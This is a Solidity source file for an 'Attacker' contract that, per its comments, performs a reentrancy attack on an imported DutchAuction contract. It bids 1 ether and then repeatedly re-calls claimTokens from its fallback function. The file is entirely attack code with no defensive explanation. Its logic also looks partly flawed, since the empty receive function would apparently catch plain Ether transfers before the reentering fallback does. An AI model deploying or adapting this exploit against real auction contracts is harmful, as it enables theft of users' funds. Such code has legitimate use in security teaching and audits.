// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "./DutchAuction.sol"; // Import the DutchAuction contract to attack.

contract Attacker {
    DutchAuction public auctionContract;

    constructor(address payable _auctionContract) {
        auctionContract = DutchAuction(_auctionContract);
    }

    // Function to perform the reentrancy attack
    function attack() public {
        // Call the bid function on the DutchAuction contract to participate in the auction.
        auctionContract.bid{value: 1 ether}(address(0));
        auctionContract.claimTokens(address(this));
    }

    fallback() external payable {
        auctionContract.claimTokens(address(this));
    }
    
    receive() external payable {
    // Handle incoming Ether here or leave it empty if no action is needed.
    }
}